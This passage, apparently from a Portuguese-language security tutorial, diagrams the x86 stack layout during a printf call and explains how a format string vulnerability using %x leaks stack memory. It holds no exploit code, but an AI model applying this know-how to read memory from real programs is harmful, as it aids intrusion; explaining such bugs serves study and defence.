| ???              | ← EBP+12 (onde 1º %x vai buscar)
+------------------+ 
| ponteiro p/ buffer| ← EBP+8 do printf (1º parâmetro)
+------------------+ 
| end. retorno      | ← EBP+4 do printf (salvo pelo call)
+------------------+ 
| ebp salvo (printf)| ← EBP do printf
+------------------+ 
| vars locais printf| 
+------------------+ ← ESP dentro do printf
(endereços baixos)
```

A vulnerabilidade de format string vaza TODA a região da pilha, não importa se a variável tem "relação" com o printf ou não. É muito poderoso e simples.

